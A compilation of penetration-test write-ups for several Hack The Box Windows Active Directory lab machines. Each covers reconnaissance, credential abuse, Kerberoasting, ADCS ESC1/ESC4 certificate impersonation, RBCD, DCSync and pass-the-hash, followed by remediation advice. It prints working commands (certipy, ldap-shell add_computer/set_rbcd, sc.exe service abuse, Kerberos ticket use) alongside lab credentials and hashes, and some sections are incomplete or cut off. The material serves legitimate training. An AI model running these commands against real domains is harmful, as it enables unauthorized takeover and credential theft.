title: Administrator
content:
Difficulty : Medium OS : Windows Target : 10.129.20.97 Severity : Provided Credential : Username: Olivia Password: ichliebedich

1.Executive Summary

This was a medium-difficulty Active Directory penetration test against the target administrator.htb (10.129.20.97). Starting with the provided low-privileged domain user credentials (Olivia : ichliebedich), the assessment progressed through reconnaissance, credential abuse, and privilege escalation. By leveraging excessive permissions identified via BloodHound (GenericAll on Michael, ForceChangePassword on Benjamin, GenericWrite on Ethan), the tester was able to reset passwords, access sensitive files on the FTP server, crack a KeePass database, and obtain additional user credentials. Further enumeration revealed a Kerberoastable account (Ethan), which was compromised, ultimately leading to DCSync rights against the domain. A successful Pass-the-Hash attack using the Administrator NTLM hash granted full domain compromise, allowing retrieval of both the user and root flags.

Table of Compromise

Stage Technique Account Involved Credential / Access Gained Impact
Initial Access Provided Credentials Olivia Olivia : ichliebedich Low-privileged domain user
Credential Abuse GenericAll (BloodHound) Michael Password reset to Password1 Account takeover
Credential Abuse ForceChangePassword (BloodHound) Benjamin Password reset to Password1 Account takeover
Lateral Movement FTP Access Benjamin Access to Backup.psafe3 KeePass database obtained
Credential Dumping KeePass cracking (JohnTheRipper) - Backup.psafe3 password: tekieromucho Exposed 3 user credentials
Credential Access KeePass database Emily, Alexander, Emma Emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
Emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur		 Multiple user accounts compromised
Privilege Escalation Kerberoasting Ethan Ethan : limpbizkit Service account compromise
Privilege Escalation GenericWrite + Kerberoast Ethan Gained DCSync rights via Ethan Full domain hash dumping capability
Domain Compromise DCSync (impacket-secretsdump) Administrator Administrator NTLM hash Full domain control
Domain Compromise Pass-the-Hash Administrator Full administrative access Root flag obtained

2.Reconnaissance & Enumeration

Scanned the target with the nmap and found the multiple ports open on the system.

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-11 12:13:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped

Using the provided credential of Olivia mapped the domain using the bloodhound and found the Olivia have a GenericAll Permission on the Michael . Changing the Password of the Michael to Password1.

Now seeing the permission of the Michael found it has a dangerous permission ForceChangePassword enabled for the Benjamin. Again changed the password of Benjamin to Password1. Using the password to login into ftp and found a password protected file Backup.psafe3

Using the John The Ripper cracked the hash of the file and found the password of the file.

Backup.psafe3:tekieromucho

Opened the file and found three credential.

emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur

Got the user flag from the emily Desktop.

4. Privilege Escalation

Using the mapping of the bloodhound find the GernericWrite permission on the ethan from the emily.

Performing the Kerberoasting attack using the emily password and got the hash of the ethan cracked using the rockyou.txt file.

ethan:limpbizkit

Found the relation b/w the ethan and the administrator and we can perform the DCSync attack.

Performing DCSync attack using the impacket-secretsdump and found the administrator hash .

Performing Pass-the-hash attack we gained the administrator access and got the root flag.

5.Remediation

  • Enforce Least Privilege: Remove excessive ACL permissions such as GenericAll, GenericWrite, and ForceChangePassword on user objects. Regularly audit and minimize delegation rights using tools like BloodHound or PowerView.
  • Strong Password Policy & Passwordless where possible: Enforce complex, long passwords and implement password spraying protection. Consider moving away from password-based authentication for service accounts.
  • Disable or protect Kerberoastable accounts: Set the "Do not require Kerberos pre-authentication" flag only when absolutely necessary and use strong, random passwords (25+ characters) for all service accounts. Monitor for unusual TGS requests.
  • Secure File Shares & FTP: Avoid storing sensitive credential files (e.g., KeePass databases) on accessible FTP servers. Implement proper access controls and encryption.
  • Monitor & Detect DCSync: Enable auditing for replication rights and monitor for anomalous use of secretsdump, mimikatz, or LSADUMP-style activity. Restrict DCSync rights to only necessary Domain Controllers and backup operators.
  • Regular BloodHound / AD audits: Perform periodic enumeration of dangerous permissions and AD misconfigurations.
  • Multi-factor Authentication (MFA): Enable MFA wherever possible, especially for privileged accounts, to mitigate Pass-the-Hash and credential reuse attacks.

title: Authority
content:
Difficulty : Medium OS : Windows Target : 10.129.20.158 Severity : [critical]

1.Executive Summary

The security assessment of the Authority Windows Domain Controller revealed a critical compromise path starting from publicly accessible sensitive information and culminating in full Forest-level administrative control.

The attack began with the discovery of unauthenticated SMB guest access to a development share, which contained cleartext credentials for an Ansible deployment. These credentials allowed for the manipulation of a Password Manager (PWM) configuration. By redirecting LDAP queries to an attacker-controlled listener, the credentials for a service account (svc_ldap) were intercepted.

Further internal enumeration identified a critical misconfiguration in Active Directory Certificate Services (ADCS). Specifically, the CordVPN certificate template was vulnerable to ESC1, allowing any domain user to request a certificate with arbitrary Subject Alternative Names (SAN). By impersonating a Domain Administrator through this certificate, the attacker was able to manipulate Domain Controller DACLs, perform Resource-Based Constrained Delegation (RBCD), and ultimately dump the Domain Controller's NTDS.dit database. This resulted in the compromise of the Domain Administrator hash and full control over the Active Directory environment.

Table of Compromise

Stage Technique Account Involved Credential / Access Gained Impact
Initial Access Unauthenticated SMB Guest Access - Access to Development share Sensitive files and credentials exposed
Credential Access Cleartext credentials in ansible_inventory Administrator administrator:Welcome1 (Ansible creds) High-privileged credential leak
Exploitation PWM Configuration Manipulation + LDAP Redirect svc_ldap svc_ldap:lDaP_1n_th3_cle4r! Service account compromise
Initial Foothold WinRM Access svc_ldap Interactive shell + User flag Low-privileged domain access
Privilege Escalation ADCS Enumeration (Certipy) svc_ldap Discovery of vulnerable CordVPN template (ESC1) Certificate template misconfiguration found
Privilege Escalation ESC1 Abuse (ADCS) Administrator (impersonated) Certificate with arbitrary SAN for Domain Administrator Ability to request admin certificates
Privilege Escalation Resource-Based Constrained Delegation (RBCD) ExploitMS$ + AUTHORITY$ Added computer + RBCD + Full control on Domain Controller Delegation rights for impersonation
Credential Dumping NTDS.dit extraction / Domain Admin hash dump Administrator Domain Administrator NTLM hash Full domain credential access
Domain Compromise Pass-the-Hash Administrator Full administrative shell + Root flag Complete Forest-level compromise

2.2 Found the guest access to the smb share Development it gave a lot of information .

└──╼ [★]$ cat ansible_inventory

ansible_password: Welcome1

3. Exploitation

Using the credential pWm_@dm!N_!23 in the configuration editor and change the LDAP URLS to your Ip with a netcat listner on port 389.

Captures the ldap credential of svc_ldap.

svc_ldap:lDaP_1n_th3_cle4r!

Using the above credential of svc_ldap I have Logined in the evil-winrm session and got the user flag.

4. Privilege Escalation

Used Certipy from the attacker machine to enumerate the ADCS configuration and identify vulnerable templates. Using the svc_ldap as user the command I run to enumerate the templates.

certipy find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable -enabled

Found this Vulnerable template CordVPN. This is vulnerable with ESC1 : Misconfigured Template(The Impersonator)

4.1 Exploiting ESC1 : Added a new user to the machine. We will now impersonate the Administrator and request a certificate. Tried to get the hash of the administrator but got this error.

Fixing this error to get the administrative hash. Extracted the admin.crt and admin.key from the administrator.pfx . Got the ldap-shell from those files. Added a computer in the domain via the administrative ldap-shell .

# add_computer ExploitMS Password123!
Attempting to add a new computer with the name: ExploitMS$
Inferred Domain DN: DC=authority,DC=htb
Inferred Domain Name: authority.htb
New Computer DN: CN=ExploitMS,CN=Computers,DC=authority,DC=htb
Adding new computer with username: ExploitMS$ and password: Password123! result: OK

Modified the DACL and gave this user the control of AUTHORITY$ .

# set_rbcd AUTHORITY$ ExploitMS$
Found Target DN: CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb
Target SID: S-1-5-21-622327497-3269355298-2248959698-1000

Found Grantee DN: CN=ExploitMS,CN=Computers,DC=authority,DC=htb
Grantee SID: S-1-5-21-622327497-3269355298-2248959698-12102
Delegation rights modified successfully!
ExploitMS$ can now impersonate users on AUTHORITY$ via S4U2Proxy

# grant_control AUTHORITY$ ExploitMS$
Found Target DN: CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb
Target SID: S-1-5-21-622327497-3269355298-2248959698-1000

Found Grantee DN: CN=ExploitMS,CN=Computers,DC=authority,DC=htb
Grantee SID: S-1-5-21-622327497-3269355298-2248959698-12102
DACL modified successfully!
ExploitMS$ now has control of AUTHORITY$

First found the local SAM hashes Tried pass-the-hash with this but failed. Later got the domain administrator hash.

Used this hash for pass-the-hash attack and got the administrative shell and extracted the root flag.

One more way to get the administrative shell without extract the shell.

5. Remediation

6.1 Secure ADCS Templates (ESC1)

  • Disable SAN Provider: Uncheck the "Supply in the request" flag for the Subject Name on the CordVPN and other sensitive templates.
  • Restrict Enrollment: Limit "Enroll" permissions to specific, authorized administrative groups rather than broad domain users.

6.2 Harden File Shares & Credentials

  • Disable Guest Access: Remove "Guest" and "Anonymous" access from all SMB shares, specifically the Development share.
  • Credential Hygiene: Remove cleartext passwords from configuration files (e.g., ansible_inventory) and utilize a secure vault.

6.3 Protect Active Directory Objects

  • Limit Machine Quotas: Set ms-DS-MachineAccountQuota to 0 to prevent standard users from adding rogue computer objects used in RBCD attacks.
  • Enforce LDAPS: Mandatory use of encrypted LDAP (Port 636) to prevent credential harvesting through cleartext redirection.

title: Escape
content:
Difficulty : Medium OS : Windows Target : 10.129.20.97 Severity : []

1.Executive Summary

This medium-difficulty Windows Active Directory assessment targeted the sequel.htb domain (10.129.20.97). The attack chain started with unauthenticated guest access to an SMB share containing a PDF file that disclosed credentials for the PublicUser account. Using this account, the attacker connected to the exposed MSSQL service (port 1433) and triggered an NTLM hash relay via Responder, successfully cracking the sql_svc service account password. Further enumeration from the sql_svc session revealed cleartext credentials for Ryan.Cooper. With Ryan.Cooper's access, the attacker identified a critical ADCS misconfiguration — the UserAuthentication certificate template vulnerable to ESC1 (allowing arbitrary SAN specification). By requesting a certificate impersonating the Domain Administrator and performing UnPAC-the-hash, the attacker obtained the Administrator NTLM hash and achieved full domain compromise via Pass-the-Hash, retrieving both the user and root flags.

Table of Compromise

Stage Technique Account Involved Credential / Access Gained Impact
Initial Access Unauthenticated SMB Guest Access - Access to SQL Server Procedures.pdf Credential leak
Credential Access PDF Analysis PublicUser PublicUser:GuestUserCantWrite1 Low-privileged domain access
Credential Access MSSQL + NTLM Relay (Responder) sql_svc NTLM hash captured and cracked Service account compromise
Credential Cracking Hash cracking (rockyou.txt) sql_svc sql_svc:REGGIE1234ronnie Service account access
Lateral Movement Evil-WinRM + Log Analysis Ryan.Cooper Ryan.Cooper:NuclearMosquito3 User-level shell + User flag
Privilege Escalation ADCS Enumeration (Certipy) Ryan.Cooper Discovery of vulnerable UserAuthentication template (ESC1) Certificate template misconfiguration found
Privilege Escalation ESC1 Abuse (ADCS) Administrator (impersonated) Certificate with UPN=administrator@sequel.htb Administrator certificate obtained
Credential Access UnPAC-the-hash Administrator Administrator NTLM hash extracted from .pfx High-privileged hash obtained
Domain Compromise Pass-the-Hash Administrator Full administrative shell + Root flag Complete domain compromise

2.Reconnaissance & Enumeration

There is a guest account giving access a smb share contain a file SQL Server Procedures.pdf.From the pdf file found the credential of user PublicUser.

2.1 MSSQL Scan Logined into mssql via above credential. Executed a query on the mssql shell and captured the hash on the responder.

3. Exploitation

Cracked is using the rockyou.txt file and get the password.

Logined the evil-winrm session with the above credential and found the credential of user ``

4. Privilege Escalation

Vulnerable Template Scan

certipy find -dc-ip 10.129.228.253 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -vulnerable -enabled

Found this Vulnerable template UserAuthentication. This is vulnerable with ESC1 : Misconfigured Template(The Impersonator)

Used the vulnerable certificate permission to request the administrator.pfx file.

certipy req -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -target sequel.htb -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -dc-ip 10.129.228.253
Now via a process called `UnPAC-the-hash` we extracted the hash from the `pfx` file. Now using `Pass-the-hash` attack we got the administrator shell and got the root shell. #### **5.Remediation**
  • Secure ADCS Templates: Disable the "Supply in the request" option for Subject Alternative Name (SAN) on all templates, especially UserAuthentication. Restrict enrollment and enrollment permissions to only necessary groups instead of allowing any domain user.
  • Disable Guest Access: Remove Guest/Anonymous access from all SMB shares and enforce authenticated access only.
  • Harden MSSQL Configuration: Disable unnecessary SQL logins, enforce strong passwords, and prevent NTLM authentication over the network where possible. Consider using Kerberos authentication exclusively.
  • Credential Hygiene: Avoid storing credentials in documentation (PDFs) and ensure service accounts use strong, unique, randomly generated passwords.
  • Limit Certificate Template Permissions: Review and tighten permissions on all certificate templates to prevent low-privileged users from requesting certificates with arbitrary identities.
  • Monitor for ADCS Abuse: Enable auditing for certificate enrollment and issuance events. Regularly audit ADCS configurations using tools like Certipy or Certify.
  • Network Segmentation & Relay Protection: Implement SMB signing enforcement and consider NTLM relay protections (e.g., EPA, channel binding) to prevent hash capture and relay attacks.

title: EscapeTwo
content:
Difficulty : Easy OS : Windows Target : 10.129.232.128 Severity :

Given Credentials : rose / KxEPkKe6R8su

1.Executive Summary

This easy-difficulty Windows Active Directory assessment targeted the sequel.htb domain (10.129.232.128). Starting with the provided low-privileged credentials (rose : KxEPkKe6R8su), the attacker gained access to the Accounting Department SMB share and extracted multiple user credentials from Excel files, including the powerful MSSQL sa account. Using the sa credentials, xp_cmdshell was enabled to enumerate configuration files, revealing the sql_svc service account password. Password spraying with this credential granted access as ryan. BloodHound enumeration revealed that ryan held WriteOwner permissions over the ca_svc user, allowing password reset. Further ADCS enumeration identified the DunderMifflinAuthentication template vulnerable to ESC4. By resetting the ca_svc password, requesting a certificate impersonating the Domain Administrator, and using Certipy for authentication, the attacker obtained the Administrator NTLM hash and achieved full domain compromise via Pass-the-Hash, retrieving both the user and root flags.

Table of Compromise

Stage Technique Account Involved Credential / Access Gained Impact
Initial Access Provided Credentials rose rose:KxEPkKe6R8su Low-privileged domain user
Credential Access SMB Share Enumeration - Access to Accounting Department share + Excel files Multiple credentials leaked
Credential Access Excel File Analysis sa sa:MSSQLP@ssw0rd! MSSQL sysadmin access
Exploitation MSSQL xp_cmdshell + Config File sql_svc sql_svc:WqSZAF6CysDQbGb3 Service account credential
Lateral Movement Password Spraying + WinRM ryan ryan:WqSZAF6CysDQbGb3 + User flag User-level shell

Privilege Escalation WriteOwner + ResetPassword Abuse ca_svc Password reset to Password123!! Control over certificate-requesting account
Privilege Escalation ADCS ESC4 Abuse ca_svc Certificate request with UPN=administrator@sequel.htb (DunderMifflinAuthentication) Administrator certificate obtained
Credential Access Certipy Authentication Administrator Administrator NTLM hash: 7a8d4e04986afa8ed4060f75e5a0b3ff High-privileged hash obtained
Domain Compromise Pass-the-Hash Administrator Full administrative WinRM shell + Root flag Complete domain compromise

2.Reconnaissance & Enumeration

2.1 SMB Enumeration : Using the provided credential accessed SMB Share Accounting Department gave files accounting_2024.xlsx and accounts.xlsx . Enumerating these file gave access to credentials.

SQLSVCACCOUNT="SEQUEL\sql_svc SQLSVCPASSWORD="WqSZAF6CysDQbGb3

3. EXPLOITATION

3.1 Using the above credential to spray the password on the found user over the MSSQL command execution. Found a valid credential for a winrm session.

```Credential sequel.htb\ryan:WqSZAF6CysDQbGb3 ```

Got access of the flag at the ryan Desktop .

4. Privilege Escalation

4.1 Enumerating using the bloodhound : Collected the domain information using the bloodhound-python and came across a Privilege escalation path where ryan have WriteOwner permission over user ca_svc .

bloodhound-python -u ryan -p WqSZAF6CysDQbGb3 -d sequel.htb -ns 10.129.232.128 -c All --zip

The WriteOwner Permission allows a user to change the ownership of an object to a different user or principle including the one controlled by the attacker.Consequently, an attacker can exploit this permission to take ownership of a target object.
Once the attacker successfully assumes ownership, they can fully manipulate the object. This includes modifying permissions to grant themselves or others Full Control over the object. For example, the attacker could assign _Full Control_ permissions, allowing unrestricted access to read, write, or delete the object.

Enumerating the Templates come up with a vulnerable certificate DunderMifflinAuthentication. Permission make it Vulnerable : Full Control Principals : SEQUEL.HTB\Cert Publishers This make it vulnerable to ESC4

Set the password of the ca_svc

4.2 Hashes dumping

4.3 Flag Retrieval : Used the hash to logined into the winrm session of the administrator and get the root flag from the Administrator desktop.

5. Remediation

  • Secure ADCS Templates: Review and harden certificate templates (especially those allowing ESC4). Remove unnecessary "Full Control" permissions from groups like Cert Publishers and disable templates that are not strictly required.
  • Enforce Least Privilege on AD Objects: Remove dangerous permissions such as WriteOwner from low-privileged users on sensitive accounts like ca_svc. Regularly audit ACLs using BloodHound or PowerView.
  • Disable xp_cmdshell: Keep xp_cmdshell disabled on all SQL Server instances unless absolutely required, and restrict sa and sysadmin accounts from unnecessary exposure.
  • Credential Hygiene: Avoid storing cleartext passwords in shared Excel files or configuration files on SMB shares. Use proper secret management solutions.
  • Limit Certificate Impersonation: Prevent certificate templates from allowing arbitrary UPN/SAN specification. Enforce strong enrollment restrictions.
  • Password Policy & Spraying Protection: Enforce strong, unique passwords for service accounts and implement account lockout or monitoring for password spraying attempts.
  • Monitor Privileged Group Membership: Regularly review membership in groups like Cert Publishers and other high-privilege AD groups.

title: Return
content:
Difficulty : Easy OS : Windows Target : 10.129.95.241 Severity :

1.Executive Summary

This easy-difficulty Windows assessment targeted the return.local machine (10.129.95.241). The attack began by exploiting a web-based printer admin panel at http://return.local/settings.php. By modifying the server address to the attacker's IP and setting up a netcat listener, the attacker captured cleartext credentials for the svc-printer service account. With these credentials, an Evil-WinRM session was established, revealing that svc-printer belonged to the high-privileged Server Operators and Print Operators groups. Leveraging Server Operator privileges, the attacker used sc.exe to add the svc-printer account to the local Administrators group by manipulating the Volume Shadow Copy Service (vss). After restarting the service, the account gained full local administrative rights, allowing retrieval of the root flag and complete system compromise.

Table of Compromise

Stage Technique Account Involved Credential / Access Gained Impact
Initial Access Web Admin Panel Manipulation - Printer settings page (settings.php) Ability to control LDAP/credential callback
Credential Access Credential Capture via Netcat Listener svc-printer svc-printer:1edFg43012!! Service account compromise
Initial Foothold Evil-WinRM Access svc-printer Interactive shell + User flag Low-privileged shell access
Privilege Escalation Group Membership Enumeration svc-printer Membership in Server Operators & Print Operators High-privilege group discovery
Privilege Escalation Server Operators Abuse (sc.exe) svc-printer Added svc-printer to local Administrators group via vss service Local Administrator rights gained
Domain Compromise Local Administrators Access svc-printer Full administrative shell + Root flag Complete system compromise

2.Enumeration & Exploitation

2.1 Found a domain return.local in the nmap scan hosting a admin panel of the Printer. It has a setting to update the password . Visiting http://return.local/settings.php and after updating the server Address to my own ip with starting a netcat listner on my machine.

I have captured the credential of the `svc-printer` . 
svc-printer:1edFg43012!!

Used it to get the evil-winrm session login and get the user flag.

4.Privilege Escalation

Using the command in the svc-printer evil-winrm shell .

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> net user svc-printer

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.

It say the user svc-printer is the member of Server Operator As it grants ability to manage the services we can use it for the privilege escalation.

Used the sc.exe to add the svc-printer in the Administrator Local Group. After restarting the service vss we can see svc-printer in the local Administrator group .

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe stop vss
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
svc-printer
The command completed successfully.

Now reconnecting the svc-printer in evil-winrm session. We can read the root flag.

It says we now have the administrative access now we can dump the hash of the administrator and also logined as the administrator.

5. Remediation

  • Secure Web Applications: Sanitize and validate all user inputs in administrative panels (especially server address, URL, or LDAP fields). Implement proper authentication and authorization to prevent unauthorized configuration changes.
  • Credential Protection: Never allow applications to send credentials in cleartext over the network. Enforce encrypted channels (LDAPS, HTTPS) and avoid callback mechanisms that expose plaintext passwords.
  • Least Privilege Principle: Remove the svc-printer account from highly privileged groups such as Server Operators, Print Operators, and Remote Management Users unless strictly necessary.
  • Service Hardening: Restrict modification of critical services (like vss) to only Domain Admins or specific trusted accounts. Monitor and audit changes to service configurations.
  • Group Membership Review: Regularly audit membership of built-in privileged groups (Server Operators, Print Operators, Administrators) and remove unnecessary service accounts.
  • Network Segmentation: Isolate printer and IoT management interfaces from the main domain network and restrict access to trusted management stations only.
  • Monitoring: Enable auditing for service control, group membership changes, and suspicious administrative panel activity.

title: Sauna
content:
Difficulty : Easy OS : Windows Target : 10.129.95.180 Severity :

Attack -Type : AS-REP Roasting and DCSync attack.

1.Executive Summary

The security assessment of the Sauna domain controller (10.129.95.180) revealed a critical compromise path starting from publicly available information. By harvesting employee names from the corporate website, a list of potential usernames was generated and tested for Kerberos vulnerabilities. This led to the discovery of an account (fsmith) with Kerberos Pre-Authentication disabled, allowing for an AS-REP Roasting attack and subsequent password cracking.

Once inside the network, internal enumeration via WinPEAS uncovered cleartext credentials for a service account, svc_loanmgr, stored in the Windows Registry. Analysis through BloodHound revealed that this service account possessed DCSync privileges (GetChangesAll), a high-impact permission that allows an attacker to request any user's password hash from the Domain Controller. By exploiting this, the NTLM hash for the Domain Administrator was retrieved, granting full administrative control over the entire domain environment.

Phase Tool/Technique Description
Enumeration Nmap / Web Scraping Identified services and harvested employee names from the website.
Initial Access AS-REP Roasting Exploited fsmith due to disabled Kerberos pre-authentication to obtain a crackable hash.
Credential Cracking Hashcat / RockYou Cracked the hash for fsmith to reveal the password Thestrokes23.
Privilege Escalation WinPEAS Discovered cleartext credentials for svc_loanmgr in the registry.
Internal Recon BloodHound Mapped the path from svc_loanmgr to Domain Admin via GetChangesAll permissions.
Lateral Movement DCSync Attack Used secretsdump.py to dump the Domain Administrator's NTLM hash.
Full Compromise Pass-the-Hash Authenticated as Administrator via evil-winrm using the retrieved hash.

2.Enumeration & Exploitation

2.1 Enumerating Website : Scanned the Ip and found the multiple ports running a website . 

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-10 22:02:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped

Extracted the team members name from the website and created the multiple usernames. Using that name performed AS-REP Roasting using the usernames. Got the hash of the fsmith . Cracked using the rockyou.txt file and found the password .

fsmith:Thestrokes23

Using the credential to get a session of winrm as the user fsimth and get the user flag.

3.Privilege Escalation

Running the winpeas in the evil-winrm session of the fsmith and found the credential of svc_loanmanager.

svc_loanmgr:Moneymakestheworldgoround!

Now checking the permission of the svc_loanmanager in the bloodhound data and saw a dangerous permission(GetChangesAll) svc_loanmanager user has on the Domain.

Now we can performed the DCSync attack and used the secretsdump.py to get all the hashes of the domain.

Using the administrative hash performed the pass-the-hash attack to get the evil-winrm session of the administrator and get the root flag.

4.Remediation

To secure the environment against these attack vectors, the following actions are recommended:

  • Disable Weak Kerberos Settings: Identify all accounts with "Do not require Kerberos pre-authentication" enabled and re-enable this security feature. This prevents attackers from requesting hashes without knowing the password.
  • Secure Service Account Permissions: Review and audit the DCSync (GetChanges/GetChangesAll) permissions on the Domain object. These should be strictly limited to Domain Controllers and highly trusted administrative accounts.
  • Eliminate Cleartext Credentials: Investigate why svc_loanmgr credentials were saved in the Winlogon registry or other cleartext locations. Disable Autologon features and use Group Policy Preferences (GPP) or Credential Guard to protect sensitive data.
  • Username Convention Privacy: Avoid using easily predictable username formats based on public website data. Implement account lockout policies to deter large-scale username enumeration.
  • Enforce Strong Passwords: Ensure all users, especially service accounts, utilize complex, long passwords (25+ characters) to make offline cracking attempts like AS-REP Roasting unfeasible.

title: Scrambled
content:
Difficulty : Medium OS : Windows Target : 10.129.5.122 Severity : []

1.Executive Summary

This medium-difficulty Windows Active Directory assessment targeted the scrm.local domain (10.129.5.122). The attack chain began with enumeration of the corporate intranet website, which revealed the username ksimpson and a hint that the password matched the username. After obtaining a Kerberos TGT, the attacker accessed the Public SMB share and discovered a PDF indicating an exposed MSSQL service. A successful Kerberoasting attack against the svcsql service account yielded the password Pegasus60. Using the derived NTLM hash and domain SID, a Silver Ticket was forged for the Administrator account to gain access to the MSSQL database. Enumeration of the ScrambleHR database exposed credentials for the MiscSvc account (ScrambledEggs9900). A new TGT was generated for MiscSvc, granting an Evil-WinRM shell and retrieval of the user flag. Further access to the IT share provided additional tools for potential privilege escalation.

The Public shares gave a pdf file named Network Security Changes.pdf it tells that the SQL is running. Performed the kerberosting attack using the ksimpson TGT . Cracked using the hash using rockyou.txt.

We can convert the password into the NTLM hashes.

└──╼ [★]$ echo -n 'Pegasus60' | iconv -t utf16le | openssl dgst -md4
MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05

Used the NTLM hash of the sqlsvc to get the Domain SID : S-1-5-21-2743207045-1827831105-2542523200

Performing the Silver Ticket Attack Now using the NTLM hash and the Domain-SID we performed the silver ticket attack and get the Administrator.ccache file to authenticate for the mssqlclient.py. Finally got the access of the MSSQL and then enumerate the database.

SQL (SCRM\administrator  dbo@master)> enum_db;

MiscSvc:ScrambledEggs9900

Now as we can't use the NTLM we are generating a ticket and using it for the evil-winrm session.

└──╼ [★]$ getTGT.py scrm.local/MiscSvc:ScrambledEggs9900

Setting /etc/krb5.conf file.

Now we can request the evil-winrm session and get the user flag

Now logined in to shares and got a exe file from the Apps folder in the IT Share.

export KRB5CCNAME=MiscSvc.ccache
smbclient.py -k -no-pass dc1.scrm.local

4.Remediation

  • Strong Password Policy: Enforce complex, unique passwords and prevent password reuse (e.g., username = password). Implement password spraying protection and regular rotation for service accounts.
  • Disable Weak Kerberos Features: Review and minimize Kerberoastable service accounts. Use strong, random passwords (25+ characters) for all service principals.
  • Secure MSSQL Databases: Restrict access to sensitive databases, avoid storing cleartext credentials in tables, and disable unnecessary features. Regularly audit database contents for exposed secrets.
  • Limit Silver Ticket Impact: Enforce Kerberos encryption types and monitor for ticket forgery. Consider enabling Protected Users group or Restricted Admin mode where appropriate.
  • SMB Share Hardening: Apply strict permissions on shares (Public, IT, HR, etc.). Remove sensitive PDFs and configuration files from publicly accessible locations.
  • Web Application Security: Sanitize user-provided data on intranet sites and avoid password policy hints that aid attackers.
  • Monitoring & Auditing: Enable auditing for Kerberos ticket requests (TGS), MSSQL logins, and unusual database queries. Monitor for Silver Ticket usage indicators.

title: Support
content:
Difficulty : Easy OS : Windows Target : Severity : Attack -Type : Resource-Based Constrained Delegation (RBCD) --- # 1.Executive Summary During the security assessment of the `support` target , multiple critical vulnerabilities were identified that allowed for the completed takeover. The attack began with the discovery of sensitive software (`UserInfo.exe`) via anonymous SMB access. Through reverse engineering of this binary , hardcoded credential for a service account (`ldap) were recovered. By leveraging these credential , a secondary user account (`support`) was compromised after finding a plaintext password stored within an insecure LDAP attribute (`info`). Final escalation to Domain Administrator was achieved by exploiting an misconfiguration in Active Directory permissions , specifically where a low-privileged group was granted (`GenericAll`) rights over the Domain Controller object. This allow Resource-Based Constrained Delegation (RBCD) attack , enabling the impersonation of the Domain Administrator.

Table of Compromise

Stage Technique Account Involved Credential / Access Gained Impact
Initial Access Anonymous SMB Access - Access to support-tools share Discovery of UserInfo.exe
Credential Access Reverse Engineering (ILSpy) ldap ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz Service account credential recovered
Credential Access LDAP Attribute Enumeration support support:Ironside47pleasure40Watchful (from info field) User account compromise
Initial Foothold Evil-WinRM Access support Interactive shell + User flag User-level domain access
Privilege Escalation BloodHound Enumeration support GenericAll on DC$ by SHARED SUPPORT ACCOUNTS group RBCD attack path identified
Privilege Escalation RBCD Exploitation ATTACKVM$ Added rogue computer + Write delegation rights on DC$ Resource-Based Constrained Delegation setup
Privilege Escalation S4U2Self + S4U2Proxy (getST.py) Administrator (impersonated) Administrator TGS for cifs/DC.support.htb Domain Administrator impersonation
Domain Compromise SMB Access via Kerberos Ticket Administrator Full access to C$ drive + Root flag Complete domain compromise

2.Reconnaissance & Enumeration

2.1 SMB Enumeration : Accessed the SMB shares with the anonymous access and enumerated a support-tools share. Found a customized software named UserInfo.exe.zip contains a lots of .exe and .dll files. Decompiling a filename UserInfo.exe in a tool ILspy gave a XOR encoded password with the key . Used then to get the final password used for the LDAP.

ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

From the Same .exe we got to know the username : ldap

3. VULNERABILITY ANALYSIS & EXPLOITATION

